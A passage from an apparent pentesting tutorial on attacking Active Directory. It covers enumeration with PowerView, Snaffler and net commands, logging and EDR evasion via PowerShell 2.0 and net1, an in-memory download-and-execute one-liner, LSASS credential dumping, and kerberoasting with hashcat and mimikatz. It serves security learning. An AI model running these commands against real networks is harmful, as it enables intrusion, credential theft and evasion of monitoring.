</span><span class="n">Get-ADGroupMember</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s2">"&lt;group name&gt;"</span><span class="w">
</span></code></pre></div>

<p>powerview can also be a particularly useful tool to gain situational awareness. all available commands are listed <a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon" rel="nofollow">here</a>, but here are a few of them in details:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># get details about a domain user:</span><span class="w">
</span><span class="n">Get-DomainUser</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">username</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Domain</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">DC</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nt">-Property</span><span class="w"> </span><span class="nx">name</span><span class="p">,</span><span class="nx">samaccountname</span><span class="p">,</span><span class="nx">description</span><span class="p">,</span><span class="nx">memberof</span><span class="p">,</span><span class="nx">whencreated</span><span class="p">,</span><span class="nx">pwdlastset</span><span class="p">,</span><span class="nx">lastlogontimestamp</span><span class="p">,</span><span class="nx">accountexpires</span><span class="p">,</span><span class="nx">admincount</span><span class="p">,</span><span class="nx">userprincipalname</span><span class="p">,</span><span class="nx">serviceprincipalname</span><span class="p">,</span><span class="nx">useraccountcontrol</span><span class="w">

</span><span class="c"># get members of a specific group, and members of</span><span class="w">
</span><span class="c"># possible nested groups as well:</span><span class="w">
</span><span class="n">Get-DomainGroupMember</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s2">"&lt;group name&gt;"</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w">

</span><span class="c"># list domain trust relationships:</span><span class="w">
</span><span class="n">Get-DomainTrustMapping</span><span class="w">

</span><span class="c"># test local admin access on specific machine with</span><span class="w">
</span><span class="c"># our current user:</span><span class="w">
</span><span class="n">Test-AdminAccess</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">computer</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># find account with SPNs, potentially kerberoastable:</span><span class="w">
</span><span class="n">Get-DomainUser</span><span class="w"> </span><span class="nt">-SPN</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="nx">samaccountname</span><span class="p">,</span><span class="nx">ServicePrincipalName</span><span class="w">
</span></code></pre></div>

<p>note also that so far, we&#39;ve shown the capabilities of the deprecated version of powerview. it is still a very useful tool, but an updated fork maintained by BC-Security is available <a href="https://github.com/BC-SECURITY/Empire/blob/master/empire/server/data/module_source/situational_awareness/network/powerview.ps1" rel="nofollow">here</a>.</p>

<p>if you need to avoid using powershell or find an alternative to powerview, <a href="https://github.com/tevora-threat/SharpView" rel="nofollow">sharpview</a> is also available. it is a .NET port of powerview and most commands listed above should work.</p>

<p>another useful tool is <a href="https://github.com/SnaffCon/Snaffler" rel="nofollow">snaffler</a>. this tool gets a list of all computers in AD and tries to find shares and readable directories to then hunt for files and credentials that could benefit us:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># find valuable files / credentials with snaffer,</span><span class="w">
</span><span class="c"># log them in specified file and only display results</span><span class="w">
</span><span class="c"># with the verbose flag:</span><span class="w">
</span><span class="n">Snaffler.exe</span><span class="w"> </span><span class="nt">-s</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">DC</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">log</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-v</span><span class="w"> </span><span class="nx">data</span><span class="w">
</span></code></pre></div>

<p>finally, we can fetch all data required by bloodhound with collectors designed for windows host, like <code>sharphound</code>. once uploaded on your windows host, run the collector like this:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># collect all with sharphound and create zip file,</span><span class="w">
</span><span class="c"># ready to upload in bloodhound:</span><span class="w">
</span><span class="o">.</span><span class="n">\SharpHound.exe</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nx">All</span><span class="w"> </span><span class="nt">--zipfilename</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">zip</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div>

<p>we might be interested in exclusively living off the land to enumerate AD, that is, using only native tools from windows and active directory: maybe we don&#39;t have internet access, maybe uploading tools to our host is nearly impossible, or maybe we want to stay stealthy.</p>

<p>one interesting trick is that several versions of powershell are often present on a given host, and powershell versions equal or older than 2.0 do not feature event logging. we can then use an older version, if present, so our actions are not logged in the event viewer:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># get info about current console host,</span><span class="w">
</span><span class="c"># pay attention to the current version</span><span class="w">
</span><span class="c"># of powershell in use:</span><span class="w">
</span><span class="n">Get-host</span><span class="w">

</span><span class="c"># attempt to spawn powershell 2.0.</span><span class="w">
</span><span class="c"># be aware that this command might</span><span class="w">
</span><span class="c"># still be logged:</span><span class="w">
</span><span class="n">powershell.exe</span><span class="w"> </span><span class="nt">-version</span><span class="w"> </span><span class="nx">2</span><span class="w">

</span><span class="c"># confirm that we indeed downgraded</span><span class="w">
</span><span class="c"># to 2.0:</span><span class="w">
</span><span class="n">Get-host</span><span class="w">
</span></code></pre></div>

<p>this is particularly useful if script block logging is enabled, as it will log <em>everything</em> typed into the terminal with powershell 3.0 or higher.</p>

<p>if we&#39;re curious to see if those changes were effective, we can check the powershell operational log in <code>applications and services logs -&gt; microsoft -&gt; windows -&gt; powershell -&gt; operational</code>, or the windows powershell log in <code>applications and services logs -&gt; windows powershell</code>.</p>

<p>in any case, older version present or not, enumeration can be performed with those commands:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># check if we're alone on host:</span><span class="w">
</span><span class="n">qwinsta</span><span class="w">

</span><span class="c"># get machine's name:</span><span class="w">
</span><span class="n">hostname</span><span class="w">

</span><span class="c"># get current username:</span><span class="w">
</span><span class="n">whoami</span><span class="w">

</span><span class="c"># get OS version and revision level:</span><span class="w">
</span><span class="p">[</span><span class="n">System.Environment</span><span class="p">]::</span><span class="n">OSVersion.Version</span><span class="w">

</span><span class="c"># get patches and hotfixes present on host:</span><span class="w">
</span><span class="n">wmic</span><span class="w"> </span><span class="nx">qfe</span><span class="w"> </span><span class="nx">get</span><span class="w"> </span><span class="nx">Caption</span><span class="p">,</span><span class="nx">Description</span><span class="p">,</span><span class="nx">HotFixID</span><span class="p">,</span><span class="nx">InstalledOn</span><span class="w">

</span><span class="c"># get basic host info:</span><span class="w">
</span><span class="n">wmic</span><span class="w"> </span><span class="nx">computersystem</span><span class="w"> </span><span class="nx">get</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="nx">Domain</span><span class="p">,</span><span class="nx">Manufacturer</span><span class="p">,</span><span class="nx">Model</span><span class="p">,</span><span class="nx">Username</span><span class="p">,</span><span class="nx">Roles</span><span class="w"> </span><span class="nx">/format:List</span><span class="w">

</span><span class="c"># get all processes on host:</span><span class="w">
</span><span class="n">wmic</span><span class="w"> </span><span class="nx">process</span><span class="w"> </span><span class="nx">list</span><span class="w"> </span><span class="nx">/format:list</span><span class="w">

</span><span class="c"># get info about domain and domain controllers:</span><span class="w">
</span><span class="n">wmic</span><span class="w"> </span><span class="nx">ntdomain</span><span class="w"> </span><span class="nx">list</span><span class="w"> </span><span class="nx">/format:list</span><span class="w">
</span><span class="n">wmic</span><span class="w"> </span><span class="nx">ntdomain</span><span class="w"> </span><span class="nx">get</span><span class="w"> </span><span class="nx">DomainControllerAddress</span><span class="p">,</span><span class="nx">DomainName</span><span class="p">,</span><span class="nx">Roles</span><span class="w"> </span><span class="nx">/value</span><span class="w">

</span><span class="c"># get info about all local and domain accounts</span><span class="w">
</span><span class="c"># that logged into the host:</span><span class="w">
</span><span class="n">wmic</span><span class="w"> </span><span class="nx">useraccount</span><span class="w"> </span><span class="nx">list</span><span class="w"> </span><span class="nx">/format:list</span><span class="w">

</span><span class="c"># get info about local groups:</span><span class="w">
</span><span class="n">wmic</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">list</span><span class="w"> </span><span class="nx">/format:list</span><span class="w">

</span><span class="c"># get info about all system accounts that</span><span class="w">
</span><span class="c"># are used as service accounts:</span><span class="w">
</span><span class="n">wmic</span><span class="w"> </span><span class="nx">sysaccount</span><span class="w"> </span><span class="nx">list</span><span class="w"> </span><span class="nx">/format:list</span><span class="w">

</span><span class="c"># get info about peripherals:</span><span class="w">
</span><span class="n">wmic</span><span class="w"> </span><span class="nx">path</span><span class="w"> </span><span class="nx">Win32_PnPdevice</span><span class="w"> 

</span><span class="c"># get list of installed updates:</span><span class="w">
</span><span class="n">wmic</span><span class="w"> </span><span class="nx">qfe</span><span class="w"> </span><span class="nx">list</span><span class="w"> </span><span class="nx">brief</span><span class="w">

</span><span class="c"># get network adapter configuration:</span><span class="w">
</span><span class="n">ipconfig</span><span class="w"> </span><span class="nx">/all</span><span class="w">

</span><span class="c"># get hosts stored in arp table:</span><span class="w">
</span><span class="n">arp</span><span class="w"> </span><span class="nt">-a</span><span class="w">

</span><span class="c"># get routing table for potential</span><span class="w">
</span><span class="c"># lateral movement:</span><span class="w">
</span><span class="n">route</span><span class="w"> </span><span class="nx">print</span><span class="w">

</span><span class="c"># get environment variables for current session,</span><span class="w">
</span><span class="c"># in cmd.exe:</span><span class="w">
</span><span class="n">set</span><span class="w">

</span><span class="c"># get the domain name the host is joined to,</span><span class="w">
</span><span class="c"># in cmd.exe:</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="o">%</span><span class="nx">USERDOMAIN</span><span class="o">%</span><span class="w">

</span><span class="c"># get the domain controller the host is using</span><span class="w">
</span><span class="c"># for authorization, in cmd.exe:</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="o">%</span><span class="nx">logonserver</span><span class="o">%</span><span class="w">

</span><span class="c"># get a detailed summary of current host:</span><span class="w">
</span><span class="n">systeminfo</span><span class="w">

</span><span class="c"># list all modules loaded for use:</span><span class="w">
</span><span class="n">Get-Module</span><span class="w">

</span><span class="c"># get execution policy settings for each</span><span class="w">
</span><span class="c"># scope on current host:</span><span class="w">
</span><span class="n">Get-ExecutionPolicy</span><span class="w"> </span><span class="nt">-List</span><span class="w">

</span><span class="c"># bypass execution policy settings until</span><span class="w">
</span><span class="c"># process termination:</span><span class="w">
</span><span class="n">Set-ExecutionPolicy</span><span class="w"> </span><span class="nx">Bypass</span><span class="w"> </span><span class="nt">-Scope</span><span class="w"> </span><span class="nx">Process</span><span class="w">

</span><span class="c"># get powershell history of specified user:</span><span class="w">
</span><span class="n">Get-Content</span><span class="w"> </span><span class="nx">C:\Users\</span><span class="err">&lt;</span><span class="nx">username</span><span class="err">&gt;</span><span class="nx">\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt</span><span class="w">

</span><span class="c"># get environment variable values:</span><span class="w">
</span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="nx">Env:</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ft</span><span class="w"> </span><span class="nx">Key</span><span class="p">,</span><span class="nx">Value</span><span class="w">

</span><span class="c"># download file from URL and call it</span><span class="w">
</span><span class="c"># strictly from memory:</span><span class="w">
</span><span class="n">powershell</span><span class="w"> </span><span class="nt">-nop</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"iex(New-Object Net.WebClient).DownloadString('&lt;URL&gt;'); &lt;next commands&gt;"</span><span class="w">

</span><span class="c"># check if firewall is active</span><span class="w">
</span><span class="c"># and filtering traffic:</span><span class="w">
</span><span class="n">netsh</span><span class="w"> </span><span class="nx">advfirewall</span><span class="w"> </span><span class="nx">show</span><span class="w"> </span><span class="nx">state</span><span class="w">

</span><span class="c"># check firewall settings:</span><span class="w">
</span><span class="n">netsh</span><span class="w"> </span><span class="nx">advfirewall</span><span class="w"> </span><span class="nx">show</span><span class="w"> </span><span class="nx">allprofiles</span><span class="w">

</span><span class="c"># check if windows defender is running,</span><span class="w">
</span><span class="c"># from cmd.exe:</span><span class="w">
</span><span class="n">sc</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">windefend</span><span class="w">

</span><span class="c"># get status and settings of antimalware</span><span class="w">
</span><span class="c"># on host:</span><span class="w">
</span><span class="n">Get-MpComputerStatus</span><span class="w">

</span><span class="c"># keep in mind that net commands are</span><span class="w">
</span><span class="c"># often monitored by EDRs. net1 can</span><span class="w">
</span><span class="c"># be used instead of net to avoid a</span><span class="w">
</span><span class="c"># potential trigger.</span><span class="w">

</span><span class="c"># get info about password requirements:</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">accounts</span><span class="w">

</span><span class="c"># get password and lockout policy in</span><span class="w">
</span><span class="c"># domain:</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">accounts</span><span class="w"> </span><span class="nx">/domain</span><span class="w">

</span><span class="c"># get info about domain groups:</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">/domain</span><span class="w">

</span><span class="c"># get users with domain admin privileges:</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="s2">"Domain Admins"</span><span class="w"> </span><span class="nx">/domain</span><span class="w">

</span><span class="c"># get list of machines connected to the</span><span class="w">
</span><span class="c"># domain:</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="s2">"domain computers"</span><span class="w"> </span><span class="nx">/domain</span><span class="w">

</span><span class="c"># get list of domain controllers</span><span class="w">
</span><span class="c"># computers:</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="s2">"Domain Controllers"</span><span class="w"> </span><span class="nx">/domain</span><span class="w">

</span><span class="c"># get users that belong to specified</span><span class="w">
</span><span class="c"># group:</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">domain</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/domain</span><span class="w">

</span><span class="c"># get list of domain groups:</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">groups</span><span class="w"> </span><span class="nx">/domain</span><span class="w">

</span><span class="c"># get local groups on host:</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">localgroup</span><span class="w">

</span><span class="c"># get users that belong to administrators</span><span class="w">
</span><span class="c"># group in domain:</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">localgroup</span><span class="w"> </span><span class="nx">administrators</span><span class="w"> </span><span class="nx">/domain</span><span class="w">

</span><span class="c"># get info about specified group:</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">localgroup</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">group</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># add user to administrators:</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">localgroup</span><span class="w"> </span><span class="nx">administrators</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">username</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/add</span><span class="w">

</span><span class="c"># check available shares:</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">share</span><span class="w">

</span><span class="c"># get info about a user belonging</span><span class="w">
</span><span class="c"># in domain:</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">account</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/domain</span><span class="w">

</span><span class="c"># get list of all users in domain:</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nx">/domain</span><span class="w">

</span><span class="c"># get info about current user:</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="o">%</span><span class="nx">username</span><span class="o">%</span><span class="w">

</span><span class="c"># mount a share locally:</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">use</span><span class="w"> </span><span class="nx">x:</span><span class="w"> </span><span class="nx">\</span><span class="err">&lt;</span><span class="nx">computer</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="nx">\</span><span class="err">&lt;</span><span class="nx">share</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># list all computers:</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">view</span><span class="w">

</span><span class="c"># list all shares on domain:</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">/all</span><span class="w"> </span><span class="nx">/domain</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">domain</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># list all shares of a machine:</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">\</span><span class="err">&lt;</span><span class="nx">computer</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/ALL</span><span class="w">

</span><span class="c"># list all machines of domain:</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">/domain</span><span class="w"> 
</span></code></pre></div>

<p>if we have elevated privileges on our host or we can run cmd.exe / powershell as SYSTEM, we might also benefit from <code>dsquery</code> which allows us to find active directory objects:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># get users as active directory objects:</span><span class="w">
</span><span class="n">dsquery</span><span class="w"> </span><span class="nx">user</span><span class="w">

</span><span class="c"># get computers:</span><span class="w">
</span><span class="n">dsquery</span><span class="w"> </span><span class="nx">computer</span><span class="w">

</span><span class="c"># use wildcards to view all objects in an OU:</span><span class="w">
</span><span class="n">dsquery</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="s2">"CN=&lt;common name&gt;,DC=&lt;DC name&gt;,DC=&lt;DC domain&gt;"</span><span class="w">

</span><span class="c"># use LDAP search filters with dsquery to get</span><span class="w">
</span><span class="c"># users with the PASSWD_NOTREQD flag set in</span><span class="w">
</span><span class="c"># the userAccountControl attribute:</span><span class="w">
</span><span class="n">dsquery</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nt">-filter</span><span class="w"> </span><span class="s2">"(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))"</span><span class="w"> </span><span class="nt">-attr</span><span class="w"> </span><span class="nx">distinguishedName</span><span class="w"> </span><span class="nx">userAccountControl</span><span class="w">

</span><span class="c"># get all domain controllers in current domain,</span><span class="w">
</span><span class="c"># and limit to 5 results:</span><span class="w">
</span><span class="n">dsquery</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nt">-filter</span><span class="w"> </span><span class="s2">"(userAccountControl:1.2.840.113556.1.4.803:=8192)"</span><span class="w"> </span><span class="nt">-limit</span><span class="w"> </span><span class="nx">5</span><span class="w"> </span><span class="nt">-attr</span><span class="w"> </span><span class="nx">sAMAccountName</span><span class="w">
</span></code></pre></div>

<p>LDAP queries use strings such as <code>userAccountControl:1.2.840.113556.1.4.803:=8192</code>, which can be daunting. it&#39;s important to know how they work as those can be used with many different tools.</p>

<p>in the case of <code>userAccountControl:1.2.840.113556.1.4.803:=8192</code>, we are looking at the User Account Control attributes of an object (UAC). the <code>=8192</code> part is a bitmask filtering a specific UAC attribute we want to match. there are many interesting UAC attributes we might be interesting in, here are some with their related bitmasks:</p>

<table><thead>
<tr>
<th>UAC attribute</th>
<th>bitmask</th>
</tr>
</thead><tbody>
<tr>
<td>login script will execute</td>
<td>1</td>
</tr>
<tr>
<td>account is disabled</td>
<td>2</td>
</tr>
<tr>
<td>password not required</td>
<td>32</td>
</tr>
<tr>
<td>password can&#39;t change</td>
<td>64</td>
</tr>
<tr>
<td>encrypted text password allowed</td>
<td>128</td>
</tr>
<tr>
<td>normal user account</td>
<td>512</td>
</tr>
<tr>
<td>interdomain trust account</td>
<td>2048</td>
</tr>
<tr>
<td>domain workstation or member server</td>
<td>4096</td>
</tr>
<tr>
<td>domain controller</td>
<td>8192</td>
</tr>
<tr>
<td>password does not expire</td>
<td>65536</td>
</tr>
<tr>
<td>trusted for impersonation</td>
<td>524288</td>
</tr>
<tr>
<td>account may not be impersonated</td>
<td>1048576</td>
</tr>
</tbody></table>

<p>the <code>1.2.840.113556.1.4.803</code> part refers to the Object Identifier used to match values with attributes. ending this part of the string with <code>.803</code> means that we want an exact match on the attribute. using <code>.804</code> instead would mean that we want a match if any bit in the chain is found. using <code>.1941</code> that we would want a match from the Distinguished Name of the object and walk the complete chain of ancestry to find it.</p>

<p>i&#39;m still learning about LDAP search filters and i hope to provide a better explanation later on. in the meantime, the <a href="https://learn.microsoft.com/en-us/windows/win32/adsi/search-filter-syntax" rel="nofollow">microsoft documentation</a> is quite useful. special characters like <code>&amp;</code> (AND), <code>|</code> (OR), and <code>!</code> (NOT) can also be used to add logical operators, like so: <code>(&amp;(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))</code>.</p>

<p>DNS enumeration can also prove useful to us: as long as we have a valid domain user account in our hands, we can use <code>adidnsdump</code> to find all DNS records of a domain. this can also clarify the role of hosts with non-descriptive names:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># enumerate with adidnsdump. this will</span>
<span class="c"># create a records.csv file that we can</span>
<span class="c"># view later:</span>
adidnsdump <span class="nt">-u</span> &lt;DC name without domain&gt;<span class="se">\\</span>&lt;username&gt; ldap://&lt;DC IP&gt;

<span class="c"># use adidnsdump with -r flag to resolve</span>
<span class="c"># unknown records:</span>
adidnsdump <span class="nt">-u</span> &lt;DC name without domain&gt;<span class="se">\\</span>&lt;username&gt; ldap://&lt;DC IP&gt; <span class="nt">-r</span>
</code></pre></div>

<h2>getting serious: lateral movement and privilege escalation paths</h2>

<h3>LSASS</h3>

<p>when a user connects to a machine interactively, their credentials are usually stored in LSASS. a quick way to privilege escalation or lateral movement is to simply dump LSASS credentials, if an interesting user logged on a machine we compromised:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># check active sessions on current machine:</span>
qwinsta

<span class="c"># whether or not interesting sessions are active,</span>
<span class="c"># try to dump lSASS credentials from your attack box:</span>
nxc smb &lt;machine IP or name&gt; <span class="nt">-u</span> &lt;username&gt; <span class="nt">-p</span> &lt;password&gt; <span class="nt">--lsa</span>
</code></pre></div>

<h3>kerberoasting</h3>

<p>now that we performed serious enumeration, credentialed and uncredentialed, it is time to try lateral movement and privilege escalation.</p>

<p>one potential path for this is <code>kerberoasting</code>, if we found service accounts with Service Principal Names (SPNs) configured. but how does it work?</p>

<p>in a nutshell, kerberos works like a theme park: a domain user gets a ticket to enter the theme park (a Ticket Granting Ticket, TGT), but this alone doesn&#39;t do much. it only allows us to get into the domain and talk to the very thing that gave you a TGT: the Kerberos Key Distribution Center (KDC).</p>

<p>if we want to do anything inside a theme park, we would have to get a specific ticket for an attraction. the same thing goes with active directory: to do anything in the domain and use a service, we would have to ask the KDC for a Ticket Granting Service (TGS), one that is given for that very specific service. and only then can we use it for our own reasons, say querying a MSSQL database for instance.</p>

<p>the KDC sending us a TGS is the crucial part of the entire exchange here, because that ticket comes in two parts: one part encrypted with the user&#39;s TGT session key, which we can immediately decrypt, and the other part encrypted with the requested service account&#39;s NTLM hash.</p>

<p>we can then bruteforce NTLM hashes offline against the TGS until we manage to open it, thus enabling us to find the correct hash and password behind. in the end, we are simply performing a rainbow table attack against the TGS. we don&#39;t even have to make any request to the specified service: only the KDC needs interacting with.</p>

<p>SPNs shine through the reconnaissance phase that comes before the cracking: any user authenticated to AD can query them, enabling us to quickly list all potential service accounts vulnerable to kerberoasting. at their cores, SPNs are configured to map services to service accounts. those accounts are very similar to user accounts, but often possess elevated privileges across multiple servers. for ease of administration, their passwords are often weak, which is a shame since hardening them is the main way of preventing kerberoasting.</p>

<p>now that we explained this attack, let&#39;s walk through it from a linux host:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># gathering SPN accounts with impacket-GetUserSPNs.py.</span>
<span class="c"># of course, accounts from the domain admins group should</span>
<span class="c"># be prioritized for cracking:</span>
GetUserSPNs.py <span class="nt">-dc-ip</span> &lt;DC IP&gt; &lt;DC name&gt;/&lt;username&gt;:&lt;password&gt;

<span class="c"># get all TGS tickets from SPN accounts:</span>
GetUserSPNs.py <span class="nt">-dc-ip</span> &lt;DC IP&gt; &lt;DC name&gt;/&lt;username&gt;:&lt;password&gt; <span class="nt">-request</span>

<span class="c"># get the TGS ticket of a specific account:</span>
GetUserSPNs.py <span class="nt">-dc-ip</span> &lt;DC IP&gt; &lt;DC name&gt;/&lt;username&gt;:&lt;password&gt; <span class="nt">-request-user</span> &lt;SPN account&gt;

<span class="c"># get the TGS ticket of a specific account and save it to file:</span>
GetUserSPNs.py <span class="nt">-dc-ip</span> &lt;DC IP&gt; &lt;DC name&gt;/&lt;username&gt;:&lt;password&gt; <span class="nt">-request-user</span> &lt;SPN account&gt; <span class="nt">-outputfile</span> &lt;file name&gt;

<span class="c"># crack a ticket with hashcat:</span>
hashcat <span class="nt">-m</span> 13100 &lt;file name&gt; &lt;wordlist path&gt;

<span class="c"># crack a ticket with john:</span>
john &lt;file name&gt; <span class="nt">--wordlist</span><span class="o">=</span>&lt;wordlist path&gt;

<span class="c"># if credentials are found, confirm them with</span>
<span class="c"># netexec / crackmapexec:</span>
nxc smb &lt;DC IP&gt; <span class="nt">-u</span> &lt;username&gt; <span class="nt">-p</span> &lt;password&gt;
</code></pre></div>

<p>let&#39;s explore our options from a windows host, both semi-manual and automated:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># get SPNs with setspn.exe:</span><span class="w">
</span><span class="n">setspn.exe</span><span class="w"> </span><span class="nt">-Q</span><span class="w"> </span><span class="o">*</span><span class="nx">/</span><span class="o">*</span><span class="w">

</span><span class="c"># add the identity model class .NET framework</span><span class="w">
</span><span class="c"># class to our powershell session, then use</span><span class="w">
</span><span class="c"># it to request a TGS ticket for a specified</span><span class="w">
</span><span class="c"># SPN account:</span><span class="w">
</span><span class="n">Add-Type</span><span class="w"> </span><span class="nt">-AssemblyName</span><span class="w"> </span><span class="nx">System.IdentityModel</span><span class="w">
</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.IdentityModel.Tokens.KerberosRequestorSecurityToken</span><span class="w"> </span><span class="nt">-ArgumentList</span><span class="w"> </span><span class="s2">"&lt;SPN account name&gt;.&lt;DC name&gt;:&lt;port number&gt;"</span><span class="w">

</span><span class="c"># get all TGS tickets with setspn.exe.</span><span class="w">
</span><span class="c"># computer accounts will also be retrieved,</span><span class="w">
</span><span class="c"># not great as they must often be ignored:</span><span class="w">
</span><span class="n">setspn.exe</span><span class="w"> </span><span class="nt">-T</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">DC</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Q</span><span class="w"> </span><span class="o">*</span><span class="nx">/</span><span class="o">*</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-String</span><span class="w"> </span><span class="s1">'^CN'</span><span class="w"> </span><span class="nt">-Context</span><span class="w"> </span><span class="nx">0</span><span class="p">,</span><span class="nx">1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.IdentityModel.Tokens.KerberosRequestorSecurityToken</span><span class="w"> </span><span class="nt">-ArgumentList</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">Context</span><span class="o">.</span><span class="n">PostContext</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="nf">Trim</span><span class="p">()</span><span class="w"> </span><span class="p">}</span><span class="w">

</span><span class="c"># next, run mimikatz to extract tickets</span><span class="w">
</span><span class="c"># from memory:</span><span class="w">
</span><span class="o">.</span><span class="n">\mimikatz.exe</span><span class="w">

</span><span class="c"># in mimikatz prompt, run the following</span><span class="w">
</span><span class="c"># commands:</span><span class="w">
</span><span class="n">base64</span><span class="w"> </span><span class="nx">/out:true</span><span class="w"> </span><span class="c"># encoding tickets in base64 for easier exports</span><span class="w">
</span><span class="n">kerberos::list</span><span class="w"> </span><span class="nx">/export</span><span class="w">
</span></code></pre></div>

<p>next, after copying the base64-encoded tickets on our attack box:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># inline the base64-encoded ticket:</span>
<span class="nb">echo</span> <span class="s2">"&lt;base64 TGS ticket&gt;"</span> |  <span class="nb">tr</span> <span class="nt">-d</span> <span class="se">\\</span>n <span class="o">&gt;</span> &lt;file name&gt;

<span class="c"># decode base64 to get kirbi format in new file:</span>
<span class="nb">cat</span> &lt;file name&gt; | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span> &lt;kirbi file name&gt;

<span class="c"># extract kerberos ticket with kirbi2john,</span>
<span class="c"># which will output results to "crack_file"</span>
